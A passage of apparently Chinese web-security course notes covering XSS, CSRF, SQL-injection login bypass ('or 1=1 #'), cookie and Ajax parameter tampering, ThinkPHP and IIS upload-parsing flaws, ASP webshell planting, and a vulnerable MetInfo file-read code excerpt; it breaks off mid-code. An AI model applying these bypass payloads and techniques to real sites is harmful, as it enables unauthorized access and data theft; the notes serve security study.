$_SERVER[&#x27;PHP_SELF&#x27;]//正在执行脚本的文件名</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;argv&#x27;] //传递给该脚本的参数。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;argc&#x27;] //传递给程序的命令行参数的个数。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;GATEWAY_INTERFACE&#x27;]//CGI 规范的版本。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_SOFTWARE&#x27;] //服务器标识的字串</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_PROTOCOL&#x27;] //请求页面时通信协议的名称和版本</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REQUEST_METHOD&#x27;]//访问页面时的请求方法</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REQUEST_URI&#x27;] //URL路径</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;QUERY_STRING&#x27;] //查询(query)的字符串。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;DOCUMENT_ROOT&#x27;] //当前运行脚本所在的文档根目录</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT&#x27;] //当前请求的 Accept: 头部的内容。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT_CHARSET&#x27;] //当前请求的 Accept-Charset: 头部的内容。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;] //当前请求的 Accept-Encoding: 头部的内容</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;];//浏览器语言</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_CONNECTION&#x27;] //当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_HOST&#x27;] //获取当前程序所在主机,当前请求的 Host: 头部的内容。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_REFERER&#x27;] //链接到当前页面的前一页面的 URL 地址。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_USER_AGENT&#x27;] //当前请求的 User_Agent: 头部的内容。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTPS&#x27;]//如果通过https访问,则被设为一个非空的值(on)，否则返回off</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SCRIPT_FILENAME&#x27;] #当前执行脚本的绝对路径名。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_ADMIN&#x27;] #管理员信息</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_PORT&#x27;] #服务器所使用的端口</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_SIGNATURE&#x27;] #包含服务器版本和虚拟主机名的字符串。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PATH_TRANSLATED&#x27;] #当前脚本所在文件系统（不是文档根目录）的基本路径。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SCRIPT_NAME&#x27;] #包含当前脚本的路径。这在页面需要指向自己时非常有用。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PHP_AUTH_USER&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PHP_AUTH_PW&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;AUTH_TYPE&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型</span></span><br></pre></td></tr></table></figure>

<p>例如获取并返回访问者UA头信息，若此时功能点有获取并展示UA的功能，可以尝试进行抓包修改ua头为js代码，此时就造成了xss注入。</p>
<p>(任何将你所输入的展示在页面中的，都可能会存在xss的相关漏洞)、</p>
<h5 id="2、MYSQL-插入语法INSERT"><a href="#2、MYSQL-插入语法INSERT" class="headerlink" title="2、MYSQL-插入语法INSERT"></a>2、MYSQL-插入语法INSERT</h5><h5 id="3、输入输出-XSS-反射-存储"><a href="#3、输入输出-XSS-反射-存储" class="headerlink" title="3、输入输出-XSS&amp;反射&amp;存储"></a>3、输入输出-XSS&amp;反射&amp;存储</h5><p>输入框输入js语句（例如：)会导致浏览器在显示时会将语句执行，从而弹窗的操作（XSS反射）<br>留言板输入js语句后，因为留言板的功能会将语句保存并展示，就造成了语句存储在了数据库中就导致了xss存储型注入，利用存储型注入可以获取用户cookie。</p>
<h5 id="4、安全问题-XSS跨站-CSRF等"><a href="#4、安全问题-XSS跨站-CSRF等" class="headerlink" title="4、安全问题-XSS跨站&amp;CSRF等"></a>4、安全问题-XSS跨站&amp;CSRF等</h5><p>全局变量$_SERVER中有&#x2F;&#x2F; $_SERVER[‘HTTP_REFERER’] &#x2F;&#x2F;链接到当前页面的前一页面的 URL 地址。使用这一变量可以获取访问该链接前的上一个链接地址，在预防CSRF（跨站脚本注入）中可以起到验证跳转地址是否为恶意地址，起到防范作用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CSRF:</span><br><span class="line">要成功实施 CSRF（跨站请求伪造）攻击，通常需要满足一定的前提条件，包括：</span><br><span class="line">1、 目标网站存在漏洞：CSRF 攻击的基本原理是利用用户在访问目标网站时已经登录过的认证信息，因此目标网站必须存在相应的漏洞才能被攻击者利用。例如，目标网站没有进行有效的身份验证或令牌校验，允许从外部发送请求等。</span><br><span class="line">2、用户已经登录目标网站：由于 CSRF攻击需要利用用户已经登录过的认证信息，因此攻击者必须确保受害用户在攻击发起时已经登录了目标网站，并且浏览器保存了相关的 Cookie 或Session 信息。</span><br><span class="line">3、攻击者能够构造恶意请求：为了实施 CSRF攻击，攻击者需要能够构造出目标网站所接受的合法请求格式，并将其发送到目标网站。</span><br><span class="line"></span><br><span class="line">要和另一个后边会涉及到的CSOP进行区分</span><br></pre></td></tr></table></figure>

<h4 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h4><h5 id="小迪博客输入输出-留言板-访问获取"><a href="#小迪博客输入输出-留言板-访问获取" class="headerlink" title="小迪博客输入输出&amp;留言板&amp;访问获取"></a>小迪博客输入输出&amp;留言板&amp;访问获取</h5><p>通过输入输出、留言板实现xss反射型和存储型注入</p>
<h5 id="墨者靶场-IP地址伪造来源-来源页伪造"><a href="#墨者靶场-IP地址伪造来源-来源页伪造" class="headerlink" title="墨者靶场-IP地址伪造来源&amp;来源页伪造"></a>墨者靶场-IP地址伪造来源&amp;来源页伪造</h5><p>通过burp抓包修改refer字段绕过网页的访问限制（来源页伪造）<br>网站存在IP地址限制访问，通过抓包修改来源IP实现绕过</p>
<p>只有当代码中获取IP为$_SERVER[“HTTP_X_FORWORDED_FOR”]时才可通过抓包改包实现绕过，其他的获取ip的方法可能无法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">拓展：</span><br><span class="line">ctf中常考的http相关内容</span><br><span class="line">从本地访问：  修改http报文中的XFF，X-Real-IP，Client-IP</span><br><span class="line">从哪里来： Reference</span><br><span class="line">要用什么浏览器：User-Agent</span><br><span class="line">代理： via</span><br></pre></td></tr></table></figure>

<h1 id="第15天-PHP开发-个人博客项目-登录验证-Cookie-Session-验证码安全"><a href="#第15天-PHP开发-个人博客项目-登录验证-Cookie-Session-验证码安全" class="headerlink" title="第15天 PHP开发-个人博客项目&amp;登录验证&amp;Cookie&amp;Session&amp;验证码安全"></a>第15天 PHP开发-个人博客项目&amp;登录验证&amp;Cookie&amp;Session&amp;验证码安全</h1><h4 id="知识点：-2"><a href="#知识点：-2" class="headerlink" title="知识点："></a>知识点：</h4><p>1、后台验证-登录用户逻辑安全<br>2、后台验证-COOKIE&amp;SESSION<br>3、后台验证-验证码&amp;万能密码等<br>万能密码：判断是否登录成功是看将提交的用户密码带入数据库进行查询后是否返回数据或返回行数是否对应。<br>因为出巡过程中是将参数带入到数据库查询，select * from data where username&#x3D;‘admin’ and pass&#x3D;‘pass’<br>此时构造用户名为 ’ or 1&#x3D;1 # 带入到数据库中查询就为 select * from data where username&#x3D;’ ’ or 1&#x3D;1 # and pass&#x3D;‘pass’<br>此时假 或 真 为真 后面的语句通过#注释，即可绕过登录判定<br>验证码安全：验证码不失效，可通过burp抓包再不修改验证码的情况下进行密码替换。</p>
<h4 id="登录验证的流程："><a href="#登录验证的流程：" class="headerlink" title="登录验证的流程："></a>登录验证的流程：</h4><p>1、发送登录请求帐号密码<br>2、接受帐号密码<br>3、判断帐号密码的准确性<br>正确成功登录-&gt;跳转成功页面<br>错误失败登录-&gt;重新登录<br>HTTP是无状态的协议，所以为了记录身份状态信息会使用cookie和session来存储。<br>后台管理系统有多个文件页面，为了方便验证，一般会选用cookie或session进行验证<br>cookie：身份验证存储到客户端浏览器内<br>cookie安全：cookie修改 伪造 盗取<br>session:身份验证存储到服务端服务器内<br>session安全：劫持</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Cookie 和 Session 是两种常见的 Web 应用程序状态管理机制，用于在客户端和服务器端之间保存用户数据并实现用户身份认证。它们的不同点如下：</span><br><span class="line"></span><br><span class="line">1、存储位置：Cookie 保存在客户端（浏览器）中，而 Session 保存在服务器端。</span><br><span class="line"></span><br><span class="line">2、数据安全性：Cookie 中存储的数据可以被客户端篡改和查看，因此需要进行加密处理或者设置 HttpOnly 属性来防止 XSS 攻击；Session 中存储的数据只有存在服务器端，因此相对更安全。</span><br><span class="line"></span><br><span class="line">3、存储容量：Cookie 的存储容量通常比较小，一般限制在 4KB 左右；Session 的存储容量相对更大。</span><br><span class="line"></span><br><span class="line">4、生命周期：Cookie 可以设置生命周期，可以在浏览器关闭后仍然保持一段时间；Session 默认情况下在浏览器关闭后就会失效，或者等待一定时间后自动过期。</span><br><span class="line"></span><br><span class="line">5、应用场景：Cookie 主要用于实现无状态的 HTTP 协议下的用户身份验证、记住密码等功能，适合于分布式系统和负载均衡环境；Session 主要用于保存用户的会话信息，适合于需要维护会话状态的应用场景。</span><br><span class="line"></span><br><span class="line">总之，在选择 Cookie 和 Session 进行状态管理时，需要根据具体的应用需求和安全性要求进行选择。对于敏感数据和操作，建议采用 Session 来维护会话状态，并采取相应的加密和验证措施来提高数据安全性；对于较为简单的用户身份认证和状态管理，可以使用 Cookie 方便快捷地实现。</span><br></pre></td></tr></table></figure>

<h4 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h4><p>小迪博客-后台登录&amp;COOKIE&amp;SESSION<br>本地靶场-某CMS后台登录验证COOKIE脆弱<br>burp抓包修改cookie信息绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">在CTF比赛中，Cookie相关的题目还是比较多的， 特别是JWT验证这个方面，还是很重要的。</span><br></pre></td></tr></table></figure>

<h1 id="第16天-PHP开发-个人博客项目-JS-Ajax-前端逻辑-购物-登录-上传"><a href="#第16天-PHP开发-个人博客项目-JS-Ajax-前端逻辑-购物-登录-上传" class="headerlink" title="第16天 PHP开发-个人博客项目&amp;JS-Ajax&amp;前端逻辑&amp;购物&amp;登录&amp;上传"></a>第16天 PHP开发-个人博客项目&amp;JS-Ajax&amp;前端逻辑&amp;购物&amp;登录&amp;上传</h1><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h5 id="1、Js前端验证-文件上传"><a href="#1、Js前端验证-文件上传" class="headerlink" title="1、Js前端验证-文件上传"></a>1、Js前端验证-文件上传</h5><p>对上传文件的后缀名进行验证，符合要求的才能上传，可以通过PHP或者JS代码实现。<br>两种去验证的区别：<br>PHP验证的代码看不到只能黑盒测试<br>JS验证的代码的可以看到的白盒测试<br>JS禁用可以绕过前端验证</p>
<h5 id="2、Js-Ajax传递-登录-状态"><a href="#2、Js-Ajax传递-登录-状态" class="headerlink" title="2、Js-Ajax传递-登录-状态"></a>2、Js-Ajax传递-登录-状态</h5><blockquote>
<p>js ajax 请求-&gt;返回-&gt;读取返回的数据-&gt;JS ajax代码进行解析-&gt;结果<br>php 请求-&gt;返回-&gt;返回结果（服务器不会理会你自慰）</p>
</blockquote>
<p>Ajax接收infocode参数判断是否验证成功。可通过burp抓包修改参数绕过登录验证。</p>
<h5 id="3、JS-Ajax传递-购物-参数"><a href="#3、JS-Ajax传递-购物-参数" class="headerlink" title="3、JS-Ajax传递-购物-参数"></a>3、JS-Ajax传递-购物-参数</h5><p>演示案例</p>
<h6 id="1、文件上传-类型-过滤"><a href="#1、文件上传-类型-过滤" class="headerlink" title="1、文件上传-类型-过滤"></a>1、文件上传-类型-过滤</h6><p>设计：通过JavaScript进行文件后缀筛选验证</p>
<h6 id="2、状态回显-登录-状态码"><a href="#2、状态回显-登录-状态码" class="headerlink" title="2、状态回显-登录-状态码"></a>2、状态回显-登录-状态码</h6><p>设计：通过Ajax传递数据进行用户登录验证</p>
<h6 id="3、参数修改-购物一参数修改"><a href="#3、参数修改-购物一参数修改" class="headerlink" title="3、参数修改-购物一参数修改"></a>3、参数修改-购物一参数修改</h6><p>设计：通过Ajax传递数据进行购物验证</p>
<p>设计1：商品价格以前端设置价格为准，数据接收价格后运算<br>通过修改前端传递的价格和数量绕过<br>设计2：商品价格以数据库对应价格为准，数据接收价格后运算<br>虽然价格取自数据库，但是判断还是由JS代码判断，修改价格仍可绕过<br>设计3：商品价格以数据库对应价格为准，数据只接受数量后运算<br>此时判断之前也会从数据库取价格，但是因为数量是由js传递的，修改数量换成小数或者负数可以实现绕过<br>设计4：商品价格以数据库对应价格为准，数据只接受数量后做过滤运算</p>
<h1 id="第17天-PHP开发-个人博客项目-TP框架-路由访问-安全写法-历史漏洞"><a href="#第17天-PHP开发-个人博客项目-TP框架-路由访问-安全写法-历史漏洞" class="headerlink" title="第17天 PHP开发-个人博客项目&amp;TP框架&amp;路由访问&amp;安全写法&amp;历史漏洞"></a>第17天 PHP开发-个人博客项目&amp;TP框架&amp;路由访问&amp;安全写法&amp;历史漏洞</h1><h4 id="知识点：-3"><a href="#知识点：-3" class="headerlink" title="知识点："></a>知识点：</h4><p>1、基于TP框架入门安装搭建使用<br>2、基于TP框架内置安全写法评估<br>3、基于TP框架实例源码安全性评估</p>
<p>演示案例</p>
<ul>
<li>入门-简单了解-安装&amp;调试&amp;入口&amp;配置</li>
<li>使用-路由访问控制器&amp;对象&amp;函数&amp;参数</li>
<li>安全-SQL注入-不安全写法对比官方写法</li>
<li>安全-RCE执行-历史安全漏洞对比框架版本</li>
<li>实例-CMS源码-EyouCMS&amp;Fastadmin&amp;YFCMF</li>
</ul>
<p>#安全-$QL注入-不安全写法对比官方写法<br>1、参数过滤<br>2、内置过滤<br>#安全-RCE执行-历史安全漏洞对比框架版本<br>1、框架版本漏洞<br>2、框架写法安全<br>3、黑盒白盒看版本<br>#实例-CMS:源码-EyouCMS&amp;Fastadmin&amp;YFCMF</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">AdminLTE后台管理系统</span><br><span class="line">1ayui后台管理系统</span><br><span class="line">thinkcmf</span><br><span class="line">H-ui,admin后台管理系统</span><br><span class="line">tpshop</span><br><span class="line">FsatAdmin</span><br><span class="line">eyoucms</span><br><span class="line">LarryCMS后台管理系统</span><br><span class="line">tpadmin,后台管理系统</span><br><span class="line">snake后台管理系统</span><br><span class="line">ThinkSNS</span><br><span class="line">DolphinPHP后台管理系统</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a>          thinkphp框架的所有漏洞整合</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a>   更全面更新的讲解了thinkphp的各种漏洞</p>
<p>ThinkPHP5.0在没有启用路由的情况下典型的URL访问规侧是：<br><a target="_blank" rel="noopener" href="http://servername/index.php%EF%BC%88%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/[%E5%8F%82%E6%95%B0%E5%90%8D/]">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/]</a><br>thinkphp接收变量的写法<br>input(‘?get.id’);<br>input(‘?post.name’);通过thinkphp内置的写法可以过滤注入语句。（内置过滤）<br>thinkphp查询数据库语法<br>Db::table(‘think user’)-&gt;where(‘status’,1)-&gt;select（）;（即使数据接收没有过滤，带入数据库查询的时候仍进行过滤，内置过滤）<br>appplicaton&#x2F;config.php配置文件中含有app_debug和app_trace两个字段，开启用来调试验证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用到TP框架找漏洞</span><br><span class="line">1、看写法</span><br><span class="line">2、看历史漏洞-&gt;版本</span><br><span class="line">版本获取知道？</span><br><span class="line">黑盒：</span><br><span class="line">判断是不是tp返回数据包</span><br><span class="line">怎么看版本-报错</span><br><span class="line">经验：URL地址</span><br></pre></td></tr></table></figure>

<h1 id="第18天：WEB攻防-ASP安全-MDB下载植入-IIS短文件名-写权限-解析"><a href="#第18天：WEB攻防-ASP安全-MDB下载植入-IIS短文件名-写权限-解析" class="headerlink" title="第18天：WEB攻防-ASP安全&amp;MDB下载植入&amp;IIS短文件名&amp;写权限&amp;解析"></a>第18天：WEB攻防-ASP安全&amp;MDB下载植入&amp;IIS短文件名&amp;写权限&amp;解析</h1><p>这个知识点其实差不多现在也可以直接跳过了，在现在这个时候已经很少有人去使用asp搭建网站了，主流的还得是java、python什么的，甚至php可能都比asp会更多了。</p>
<h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>1、ASP环境搭建组合<br>2、ASP-数据库下载&amp;植入<br>3、IIS-短文件&amp;解析&amp;写权限</p>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=WEB%E5%AE%89%E5%85%A8&spm=1001.2101.3001.7020">WEB安全</a>攻防：<br>1、Weo源码<br>2、开发语言<br>3、中间件平台<br>4、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B&spm=1001.2101.3001.7020">数据库类型</a><br>4、第三方插件或软件</p>
<h4 id="演示案例：-1"><a href="#演示案例：-1" class="headerlink" title="演示案例："></a>演示案例：</h4><h6 id="ASP-数据库-MDB默认下载"><a href="#ASP-数据库-MDB默认下载" class="headerlink" title="ASP-数据库-MDB默认下载"></a>ASP-数据库-MDB默认下载</h6><p>常用组合：windows+ISS+ASP+Access（sqlserver）<br>原理：access数据库一般后缀名mdb（下载）asp asa(可以被执行)<br>mdb文件他在网站目录下默认数据库配置（database&#x2F;powereay2006.mdb）或者通过扫描目录得到<br>思路：如果我们知道这个数据库的地址，尝试可以下载获取数据库文件，获取当前管理员帐号密码信息</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/be974f59bf0db22217dce306e355ddd9--17d0--image-20240404165012897.png" alt="image-20240404165012897"></p>
<p>直接就可以在数据库里面去找到自己想要的信息</p>
<h6 id="ASP-数据库-ASP后门植入连接"><a href="#ASP-数据库-ASP后门植入连接" class="headerlink" title="ASP-数据库-ASP后门植入连接"></a>ASP-数据库-ASP后门植入连接</h6><p>流程：留言板写入一句话木马–菜刀连接数据库地址<br>原理：网站开启了asp解析，直接访问数据库文件会返回信息，写入一句话木马后进行连接<br>1、在留言板写入一句话木马</p>
<p>2、使用shell管理工具连接</p>
<h6 id="ASP-中间件-IIS短文件名探针安全漏洞"><a href="#ASP-中间件-IIS短文件名探针安全漏洞" class="headerlink" title="ASP-中间件-IIS短文件名探针安全漏洞"></a>ASP-中间件-IIS短文件名探针安全漏洞</h6><p>原理：Windows系统为了兼容16位MS-DOS程序，为文件名较长的文件和文件夹生成了对应的Windows 8.3短文件名。比如文件名direct~1.asp中间有一个波浪号，这种就是短文件名了。<br>使用脚本扫描网站目录造成敏感信息泄露（不同于使用字典扫描）<br>参考连接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a></p>
<h6 id="ASP-中间件IIS文件上传解析-安全漏洞"><a href="#ASP-中间件IIS文件上传解析-安全漏洞" class="headerlink" title="ASP-中间件IIS文件上传解析-安全漏洞"></a>ASP-中间件IIS文件上传解析-安全漏洞</h6><p>流程：发现网站存在上传点–上传asp木马–若存在文件名监测通过修改文件类型绕过检测–shell工具连接<br>例：1.jpg文件无法解析，修改为1.asp;.jpg即可绕过。或者1.jpg文件放在a.asp文件下也可进行解析<br>ASP-中间件-IIS配置目录读写-安全配置</p>
<h6 id="IS-put写入漏洞"><a href="#IS-put写入漏洞" class="headerlink" title="IS put写入漏洞"></a>IS put写入漏洞</h6><p>当网站为IIS6.0且开启写入权限、开启web服务拓展WebDAV则存在此漏洞</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/song123sh/article/details/123539837">https://blog.csdn.net/song123sh/article/details/123539837</a></p>
<h1 id="第19天WEB攻防-NET项目8-DLL反编译-未授权访问-配置调试报错"><a href="#第19天WEB攻防-NET项目8-DLL反编译-未授权访问-配置调试报错" class="headerlink" title="第19天WEB攻防-.NET项目8&amp;DLL反编译&amp;未授权访问&amp;配置调试报错"></a>第19天WEB攻防-.NET项目8&amp;DLL反编译&amp;未授权访问&amp;配置调试报错</h1><h4 id="知识点：-4"><a href="#知识点：-4" class="headerlink" title="知识点："></a>知识点：</h4><p>1、,NET配置调试-信息泄露<br>2、.NET源码反编译-DLL反编译<br>3、.NET常见安全问题-未授权访问</p>
<p>#判断用户的身份：<br>由于后台本身有多个功能文件页面<br>1、在每个文件里面添加判断代码<br>2、创建一个文件专门用来判断，其他文件包含调用它<br>#找未授权访问：<br>1、找那些文件没有包含验证代码文件<br>2、验证代码文件有没有可以绕过</p>
<h4 id="演示案例：-2"><a href="#演示案例：-2" class="headerlink" title="演示案例："></a>演示案例：</h4><h6 id="NET项目-DLL文件反编译指向-代码特性"><a href="#NET项目-DLL文件反编译指向-代码特性" class="headerlink" title=".NET项目-DLL文件反编译指向-代码特性"></a>.NET项目-DLL文件反编译指向-代码特性</h6><p>工具：ILSpy<br>将.net相关文件后缀名为.dll的系列文件拖入该软件内即可实现反编译，以读取源码。</p>
<h6 id="NET项目-Web-config错误调试-信息泄露"><a href="#NET项目-Web-config错误调试-信息泄露" class="headerlink" title=".NET项目-Web.config错误调试-信息泄露"></a>.NET项目-Web.config错误调试-信息泄露</h6><p>&#x2F;webconfig文件中含有customError Mode 字段，该字段是用来开发过程中显示错误信息，以便于排查原因<br>当customError mode &#x3D;“Off”，则会先显示报错信息，造成信息泄露。</p>
<blockquote>
<p>在服务器上运行网站，远程访问该网站时候，提示webconfig文件的配置无法显示程序中具体的错误信息，原因是没有将标记的“mode”属性设置为“off”，网上查询标记的详细信息如下：</p>
<p>节点用于定义一些自定义错误信息的信息。此节点有Mode和defaultRedirect两个属性，其中defaultRedirect属性是一个可选属性，表示应用程序发生错误时重定向到的默认URL，如果没有指定该属性则显示一般性错误。Mode属性是一个必选属性，它有三个可能值，它们所代表的意义分别如下：<br>Mode 说明 On 表示在本地和远程用户都会看到自定义错误信息。 Off 禁用自定义错误信息，本地和远程用户都会看到详细的错误信息。<br>RemoteOnly 表示本地用户将看到详细错误信息，而远程用户将会看到自定义错误信息。<br>这里有必要说明一下本地用户和远程用户的概念。当我们访问asp.net应用程时所使用的机器和发布asp.net应用程序所使用的机器为同一台机器时成为本地用户，反之则称之为远程用户。在开发调试阶段为了便于查找错误Mode属性建议设置为Off，而在部署阶段应将Mode属性设置为On或者RemoteOnly，以避免这些详细的错误信息暴露了程序代码细节从而引来黑客的入侵</p>
</blockquote>
<h6 id="NET项目-身份验证未授权访问安全漏洞"><a href="#NET项目-身份验证未授权访问安全漏洞" class="headerlink" title=".NET项目-身份验证未授权访问安全漏洞"></a>.NET项目-身份验证未授权访问安全漏洞</h6><p>流程：在未登录状态通过修改URL访问需登录的地址跳转到登录界面–白盒测试找到验证登录的代码（找到未授权访问文件代码–寻找包含代码–逐一审查–找到登录代码）–发现代码可通过抓包修改cookie信息绕过–造成未授权访问</p>
<h1 id="第20天-WEB攻防-PHP特性-缺陷对比函数-CTF考点-CMS审计实例"><a href="#第20天-WEB攻防-PHP特性-缺陷对比函数-CTF考点-CMS审计实例" class="headerlink" title="第20天 WEB攻防-PHP特性&amp;缺陷对比函数&amp;CTF考点&amp;CMS审计实例"></a>第20天 WEB攻防-PHP特性&amp;缺陷对比函数&amp;CTF考点&amp;CMS审计实例</h1><h4 id="知识点：-5"><a href="#知识点：-5" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、过滤函致缺陷绕过<br>2、CTF考点与代码审计</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#详细点：</span><br><span class="line">= =与=== ==弱类型对比 ===强类型对比</span><br><span class="line">md5 在PHP中md5不能用来处理数组，处理结果会返回null 所以存在MD5【1】=null=null</span><br><span class="line">intval intval() 函数用于获取变量的整数值。</span><br><span class="line">strpos strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</span><br><span class="line">in_array in_array() 函数搜索数组中是否存在指定的值。其中第三个参数若不设置为TURE则相当于弱类型判断</span><br><span class="line">preg_match preg_match 函数用于执行一个正则表达式匹配。可通过数组绕过</span><br><span class="line">str_replace str_replace() 函数替换字符串中的一些字符（区分大小写），不可迭代</span><br></pre></td></tr></table></figure>

<h4 id="演示案例1："><a href="#演示案例1：" class="headerlink" title="演示案例1："></a>演示案例1：</h4><p>ctfshow的题目（这里因为已经刷完题并且写了wp了，所以就不记上来了）</p>
<h4 id="演示案例2："><a href="#演示案例2：" class="headerlink" title="演示案例2："></a>演示案例2：</h4><h6 id="实践-代码审计-过滤缺陷文件读取"><a href="#实践-代码审计-过滤缺陷文件读取" class="headerlink" title="实践-代码审计-过滤缺陷文件读取"></a>实践-代码审计-过滤缺陷文件读取</h6><p>漏洞点在：MetInfo6.0.0&#x2F;include&#x2F;thumb.php?dir&#x3D;<br>漏洞代码文件位置：MetInfo6.0.0\app\system\include\module\old_thumb.class.php<br>有两次过滤，第一次把路径中…&#x2F;、.&#x2F;进行过滤，第二次路径中需要有http和不能存在.&#x2F;，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dir</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;./&#x27;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$_M</span>[<span class="string">&#x27;url&#x27;</span>][<span class="string">&#x27;site&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$dir</span>),<span class="number">0</span>,<span class="number">4</span>) == <span class="string">&#x27;http&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$dir</span>, <span class="string">&#x27;./&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/jpeg&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line">    <span 